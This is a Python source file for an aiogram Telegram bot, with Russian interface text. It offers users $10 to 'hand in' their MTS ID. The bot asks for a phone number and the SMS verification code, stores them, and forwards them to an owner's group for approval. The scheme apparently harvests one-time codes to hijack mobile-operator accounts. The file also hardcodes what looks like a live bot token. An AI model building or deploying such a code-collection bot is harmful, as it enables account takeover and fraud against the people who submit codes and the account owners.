import asyncio
import aiosqlite
from datetime import datetime
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, FSInputFile
)
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================== НАСТРОЙКИ ==================
BOT_TOKEN = "8680765862:AAFX3BG6hTz1A9MXLqAVHqbyutJtJ9g7W8s"
OWNER_ID = 8874871486        # твой Telegram ID (владелец)
GROUP_ID = -5448015222     # ID группы владельца (куда пересылать заявки)
ADMIN_IDS = [8874871486]        # кто может входить в /adm
SUPPORT_USERNAME = "Sm_mts"
DB_PATH = "bot.db"
# ================================================

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)


# ================== БАЗА ДАННЫХ ==================
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            full_name TEXT,
            balance REAL DEFAULT 0,
            submitted INTEGER DEFAULT 0,
            reg_date TEXT
        );
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );
        CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            code TEXT,
            status TEXT DEFAULT 'pending',
            created_at TEXT
        );
        """)
        # значения по умолчанию
        defaults = {
            "btn1_text": "📱 Сдать MTS ID",
            "btn2_text": "👤 Профиль",
            "btn3_text": "🆘 Поддержка",
            "btn1_color": "primary",
            "btn2_color": "success",
            "btn3_color": "danger",
            "profile_desc": "Ваш профиль",
            "support_desc": "Нажмите кнопку ниже, чтобы связаться с поддержкой",
            "bot_status": "on",
            "start_photo": "",   # file_id фото для /start
        }
        for k, v in defaults.items():
            await db.execute(
                "INSERT OR IGNORE INTO settings(key, value) VALUES(?,?)", (k, v)
            )
        await db.commit()


async def get_setting(key: str, default: str = "") -> str:
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT value FROM settings WHERE key=?", (key,))
        row = await cur.fetchone()
        return row[0] if row else default


async def set_setting(key: str, value: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR REPLACE INTO settings(key, value) VALUES(?,?)", (key, value)
        )
        await db.commit()


async def get_user(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
        return await cur.fetchone()


async def add_user(user_id: int, username: str, full_name: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users(user_id, username, full_name, reg_date) VALUES(?,?,?,?)",
            (user_id, username or "", full_name or "", datetime.now().isoformat())
        )
        await db.commit()


async def add_balance(user_id: int, amount: float):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE users SET balance = balance + ?, submitted = submitted + 1 WHERE user_id=?",
            (amount, user_id)
        )
        await db.commit()


# ================== СОСТОЯНИЯ ==================
class SubmitStates(StatesGroup):
    phone = State()
    code = State()


class AdminStates(StatesGroup):
    change_btn_text = State()
    change_btn_color = State()
    change_desc = State()
    broadcast = State()
    change_photo = State()


# ================== КЛАВИАТУРЫ ==================
async def main_menu_kb():
    btn1 = await get_setting("btn1_text", "📱 Сдать MTS ID")
    btn2 = await get_setting("btn2_text", "👤 Профиль")
    btn3 = await get_setting("btn3_text", "🆘 Поддержка")
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=btn1)], [KeyboardButton(text=btn2), KeyboardButton(text=btn3)]],
        resize_keyboard=True
    )
    return kb, btn1, btn2, btn3


def admin_kb():
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎨 Изменить цвет кнопки", callback_data="adm_color")],
        [InlineKeyboardButton(text="✏️ Изменить текст кнопки", callback_data="adm_text")],
        [InlineKeyboardButton(text="📝 Изменить описание", callback_data="adm_desc")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="adm_stats")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="adm_broadcast")],
        [InlineKeyboardButton(text="🖼 Сменить фото /start", callback_data="adm_photo")],
        [InlineKeyboardButton(text="⏸ Стоп / ▶️ Старт", callback_data="adm_toggle")],
    ])
    return kb


# ================== /start ==================
@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    status = await get_setting("bot_status", "on")
    if status == "off" and message.from_user.id not in ADMIN_IDS:
        await message.answer("🛑 Бот временно на технических работах. Попробуйте позже.")
        return

    await add_user(message.from_user.id, message.from_user.username, message.from_user.full_name)
    kb, btn1, btn2, btn3 = await main_menu_kb()
    photo = await get_setting("start_photo", "")
    caption = (
        "👋 Добро пожаловать!\n\n"
        "Здесь вы можете сдать свой MTS ID и получить вознаграждение.\n\n"
        "Выберите действие:"
    )
    if photo:
        try:
            await message.answer_photo(photo=photo, caption=caption, reply_markup=kb)
        except Exception:
            await message.answer(caption, reply_markup=kb)
    else:
        await message.answer(caption, reply_markup=kb)


# ================== ОБРАБОТКА КНОПОК ГЛАВНОГО МЕНЮ ==================
@router.message(F.text)
async def handle_menu(message: Message, state: FSMContext):
    user_id = message.from_user.id
    status = await get_setting("bot_status", "on")
    if status == "off" and user_id not in ADMIN_IDS:
        await message.answer("🛑 Бот временно на технических работах.")
        return

    btn1 = await get_setting("btn1_text")
    btn2 = await get_setting("btn2_text")
    btn3 = await get_setting("btn3_text")

    if message.text == btn1:
        await state.set_state(SubmitStates.phone)
        await message.answer(
            "📱 Введите номер телефона MTS в одном из форматов:\n"
            "• +79999999999\n"
            "• 89999999999\n"
            "• 9999999999"
        )

    elif message.text == btn2:
        row = await get_user(user_id)
        if not row:
            await message.answer("Профиль не найден. Нажмите /start")
            return
        # user_id, username, full_name, balance, submitted, reg_date
        desc = await get_setting("profile_desc", "Ваш профиль")
        text = (
            f"<b>{desc}</b>\n\n"
            f"🆔 ID: <code>{row[0]}</code>\n"
            f"👤 Имя: {row[2]}\n"
            f"💵 Баланс: <b>{row[3]:.2f}$</b>\n"
            f"📤 Сдано номеров: <b>{row[4]}</b>\n"
            f"📅 Регистрация: {row[5][:10]}"
        )
        await message.answer(text, parse_mode="HTML")

    elif message.text == btn3:
        desc = await get_setting("support_desc", "Нажмите кнопку ниже, чтобы связаться с поддержкой")
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✉️ Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME}")]
        ])
        await message.answer(desc, reply_markup=kb)


# ================== СДАЧА НОМЕРА ==================
@router.message(SubmitStates.phone)
async def submit_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    clean = phone.replace("+", "").replace(" ", "").replace("-", "")
    if not (clean.isdigit() and len(clean) in (10, 11)):
        await message.answer("❌ Неверный формат. Введите номер ещё раз, например: +79999999999")
        return
    await state.update_data(phone=phone)
    await state.set_state(SubmitStates.code)
    await message.answer("🔑 Теперь введите код из SMS:")


@router.message(SubmitStates.code)
async def submit_code(message: Message, state: FSMContext):
    code = message.text.strip()
    if not code.isdigit():
        await message.answer("❌ Код должен содержать только цифры. Попробуйте ещё раз.")
        return

    data = await state.get_data()
    phone = data.get("phone")
    user = message.from_user
    await state.clear()

    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(
            "INSERT INTO requests(user_id, phone, code, status, created_at) VALUES(?,?,?,?,?)",
            (user.id, phone, code, "pending", datetime.now().isoformat())
        )
        await db.commit()
        req_id = cur.lastrowid

    await message.answer(
        "⏳ Подождите, ваш номер на проверке.\n"
        "Результат придёт в скором времени."
    )

    # Отправка в группу владельца
    group_text = (
        f"📥 <b>Новая заявка #{req_id}</b>\n\n"
        f"👤 Пользователь: {user.full_name} (@{user.username or 'нет'})\n"
        f"🆔 ID: <code>{user.id}</code>\n"
        f"📞 Номер: <code>{phone}</code>\n"
        f"🔑 Код: <code>{code}</code>"
    )
    owner_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Да", callback_data=f"appr_{req_id}_{user.id}"),
            InlineKeyboardButton(text="❌ Нет", callback_data=f"rej_{req_id}_{user.id}"),
        ]
    ])
    try:
        await bot.send_message(GROUP_ID, group_text, parse_mode="HTML", reply_markup=owner_kb)
    except Exception as e:
        print("Ошибка отправки в группу:", e)
    # также владельцу в ЛС
    try:
        await bot.send_message(OWNER_ID, group_text, parse_mode="HTML", reply_markup=owner_kb)
    except Exception as e:
        print("Ошибка отправки владельцу:", e)


# ================== РЕШЕНИЕ ВЛАДЕЛЬЦА ==================
@router.callback_query(F.data.startswith("appr_"))
async def approve(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        await call.answer("Нет доступа", show_alert=True)
        return
    _, req_id, user_id = call.data.split("_")
    req_id, user_id = int(req_id), int(user_id)

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE requests SET status='approved' WHERE id=?", (req_id,))
        await db.commit()

    await add_balance(user_id, 10.0)
    try:
        await bot.send_message(user_id, "✅ Ваш номер успешно проверен!\n💰 Вам начислено <b>10$</b> на баланс.", parse_mode="HTML")
    except Exception:
        pass
    await call.message.edit_text(call.message.html_text + "\n\n✅ <b>ОДОБРЕНО</b>", parse_mode="HTML")
    await call.answer("Одобрено, +10$ начислено")


@router.callback_query(F.data.startswith("rej_"))
async def reject(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        await call.answer("Нет доступа", show_alert=True)
        return
    _, req_id, user_id = call.data.split("_")
    req_id, user_id = int(req_id), int(user_id)

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE requests SET status='rejected' WHERE id=?", (req_id,))
        await db.commit()

    try:
        await bot.send_message(user_id, "❌ К сожалению, не удалось проверить ваш номер. Попробуйте позже.")
    except Exception:
        pass
    await call.message.edit_text(call.message.html_text + "\n\n❌ <b>ОТКЛОНЕНО</b>", parse_mode="HTML")
    await call.answer("Отклонено")


# ================== АДМИН-ПАНЕЛЬ ==================
@router.message(Command("adm"))
async def adm(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔️ Нет доступа.")
        return
    await state.clear()
    status = await get_setting("bot_status", "on")
    await message.answer(
        f"🛠 <b>Админ-панель</b>\n\n"
        f"Статус бота: <b>{'▶️ работает' if status=='on' else '⏸ остановлен'}</b>\n\n"
        f"Выберите действие:",
        reply_markup=admin_kb(),
        parse_mode="HTML"
    )


@router.callback_query(F.data == "adm_stats")
async def adm_stats(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT COUNT(*) FROM users")
        users = (await cur.fetchone())[0]
        cur = await db.execute("SELECT COUNT(*) FROM requests")
        reqs = (await cur.fetchone())[0]
        cur = await db.execute("SELECT COUNT(*) FROM requests WHERE status='approved'")
        appr = (await cur.fetchone())[0]
        cur = await db.execute("SELECT COUNT(*) FROM requests WHERE status='rejected'")
        rej = (await cur.fetchone())[0]
        cur = await db.execute("SELECT COUNT(*) FROM requests WHERE status='pending'")
        pend = (await cur.fetchone())[0]
        cur = await db.execute("SELECT COALESCE(SUM(balance),0) FROM users")
        total_balance = (await cur.fetchone())[0]

    text = (
        "📊 <b>Статистика бота</b>\n\n"
        f"👥 Пользователей: <b>{users}</b>\n"
        f"📥 Всего заявок: <b>{reqs}</b>\n"
        f"✅ Одобрено: <b>{appr}</b>\n"
        f"❌ Отклонено: <b>{rej}</b>\n"
        f"⏳ В ожидании: <b>{pend}</b>\n"
        f"💰 Суммарный баланс: <b>{total_balance:.2f}$</b>"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=admin_kb())
    await call.answer()


@router.callback_query(F.data == "adm_color")
async def adm_color(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Кнопка 1 (Сдать)", callback_data="color_1")],
        [InlineKeyboardButton(text="Кнопка 2 (Профиль)", callback_data="color_2")],
        [InlineKeyboardButton(text="Кнопка 3 (Поддержка)", callback_data="color_3")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="adm_back")],
    ])
    await call.message.edit_text("🎨 Какую кнопку изменить? (цвет — для inline-кнопок в админке/уведомлениях)\n"
                                 "Фактически влияет на цвет inline-кнопок.", reply_markup=kb)
    await call.answer()


@router.callback_query(F.data == "adm_text")
async def adm_text(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Кнопка 1 (Сдать)", callback_data="text_1")],
        [InlineKeyboardButton(text="Кнопка 2 (Профиль)", callback_data="text_2")],
        [InlineKeyboardButton(text="Кнопка 3 (Поддержка)", callback_data="text_3")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="adm_back")],
    ])
    await call.message.edit_text("✏️ Какую кнопку переименовать?", reply_markup=kb)
    await call.answer()


@router.callback_query(F.data.startswith("text_"))
async def adm_text_set(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS:
        return
    num = call.data.split("_")[1]
    await state.update_data(btn_num=num)
    await state.set_state(AdminStates.change_btn_text)
    await call.message.edit_text(f"Введите новый текст для кнопки {num}:")
    await call.answer()


@router.message(AdminStates.change_btn_text)
async def adm_text_save(message: Message, state: FSMContext):
    data = await state.get_data()
    num = data["btn_num"]
    await set_setting(f"btn{num}_text", message.text.strip())
    await state.clear()
    await message.answer("✅ Текст кнопки обновлён.", reply_markup=admin_kb())


@router.callback_query(F.data.startswith("color_"))
async def adm_color_set(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS:
        return
    num = call.data.split("_")[1]
    await state.update_data(btn_num=num)
    await state.set_state(AdminStates.change_btn_color)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔵 primary", callback_data="setcol_primary")],
        [InlineKeyboardButton(text="🟢 success", callback_data="setcol_success")],
        [InlineKeyboardButton(text="🔴 danger", callback_data="setcol_danger")],
    ])
    await call.message.edit_text(f"Выберите цвет для кнопки {num}:", reply_markup=kb)
    await call.answer()


@router.callback_query(F.data.startswith("setcol_"))
async def adm_color_save(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS:
        return
    color = call.data.replace("setcol_", "")
    data = await state.get_data()
    num = data.get("btn_num", "1")
    await set_setting(f"btn{num}_color", color)
    await state.clear()
    await call.message.edit_text(f"✅ Цвет кнопки {num} изменён на {color}.", reply_markup=admin_kb())
    await call.answer()


@router.callback_query(F.data == "adm_desc")
async def adm_desc(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Профиль", callback_data="desc_profile")],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="desc_support")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="adm_back")],
    ])
    await call.message.edit_text("Что изменить?", reply_markup=kb)
    await call.answer()


@router.callback_query(F.data.startswith("desc_"))
async def adm_desc_set(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS:
        return
    key = call.data.split("_")[1]
    await state.update_data(desc_key=key)
    await state.set_state(AdminStates.change_desc)
    await call.message.edit_text(f"Введите новое описание для {key}:")
    await call.answer()


@router.message(AdminStates.change_desc)
async def adm_desc_save(message: Message, state: FSMContext):
    data = await state.get_data()
    key = data["desc_key"]
    await set_setting(f"{key}_desc", message.text)
    await state.clear()
    await message.answer("✅ Описание обновлено.", reply_markup=admin_kb())


@router.callback_query(F.data == "adm_broadcast")
async def adm_broadcast(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(AdminStates.broadcast)
    await call.message.edit_text("📢 Введите текст рассылки (всем пользователям):")
    await call.answer()


@router.message(AdminStates.broadcast)
async def adm_broadcast_send(message: Message, state: FSMContext):
    await state.clear()
    text = message.text
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT user_id FROM users")
        users = [r[0] for r in await cur.fetchall()]
    ok, fail = 0, 0
    for uid in users:
        try:
            await bot.send_message(uid, text)
            ok += 1
            await asyncio.sleep(0.05)
        except Exception:
            fail += 1
    await message.answer(f"✅ Рассылка завершена.\nОтправлено: {ok}\nОшибок: {fail}", reply_markup=admin_kb())


@router.callback_query(F.data == "adm_photo")
async def adm_photo(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS:
        return
    await state.set_state(AdminStates.change_photo)
    await call.message.edit_text("🖼 Отправьте фото для команды /start (или отправьте «удалить», чтобы убрать).")
    await call.answer()


@router.message(AdminStates.change_photo)
async def adm_photo_save(message: Message, state: FSMContext):
    if message.text and message.text.lower() == "удалить":
        await set_setting("start_photo", "")
        await state.clear()
        await message.answer("✅ Фото удалено.", reply_markup=admin_kb())
        return
    if not message.photo:
        await message.answer("Нужно отправить именно фото.")
        return
    file_id = message.photo[-1].file_id
    await set_setting("start_photo", file_id)
    await state.clear()
    await message.answer("✅ Фото обновлено.", reply_markup=admin_kb())


@router.callback_query(F.data == "adm_toggle")
async def adm_toggle(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return
    status = await get_setting("bot_status", "on")
    new = "off" if status == "on" else "on"
    await set_setting("bot_status", new)
    await call.message.edit_text(
        f"Статус бота: <b>{'▶️ работает' if new=='on' else '⏸ остановлен'}</b>",
        parse_mode="HTML",
        reply_markup=admin_kb()
    )
    await call.answer("Готово")


@router.callback_query(F.data == "adm_back")
async def adm_back(call: CallbackQuery, state: FSMContext):
    await state.clear()
    status = await get_setting("bot_status", "on")
    await call.message.edit_text(
        f"🛠 <b>Админ-панель</b>\n\nСтатус бота: <b>{'▶️ работает' if status=='on' else '⏸ остановлен'}</b>",
        parse_mode="HTML",
        reply_markup=admin_kb()
    )
    await call.answer()


# ================== ЗАПУСК ==================
async def main():
    await init_db()
    print("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
